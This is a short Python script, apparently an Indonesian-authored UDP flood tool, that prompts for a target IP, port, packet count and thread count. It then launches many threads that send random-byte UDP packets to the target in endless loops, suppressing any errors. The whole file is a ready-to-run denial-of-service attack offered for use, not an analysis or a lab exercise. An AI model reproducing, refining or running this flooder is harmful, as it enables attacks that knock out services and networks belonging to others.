#!/usr/bin/env python3
#/CODE PUNYA AXEL
import struct
import time
import socket
import random
import threading
import os
import sys

os.system("clear")

ip = str(input("\033[94m====> ★ IP   : "))
port = int(input("====> $ PORT   : "))
times = int(input("====> $ PACKET   : "))
threads = int(input("====> $ KIRIM THREADS   : "))
choice = str(input("====> ★ Confirm y/n  : "))

os.system("clear")

def run():
	data = random._urandom(16)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
		except:
			print(f" ")

def run2():
	data = random._urandom(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
		except:
			print(f" ")

def run3():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
		except:
			print(f" ")
			
def run4():
	data = random._urandom(655)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
		except:
			print(f" ")



for y in range(threads):

	if choice == 'y':

		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
	else:
		th = threading.Thread(target = run4)
		th.start()
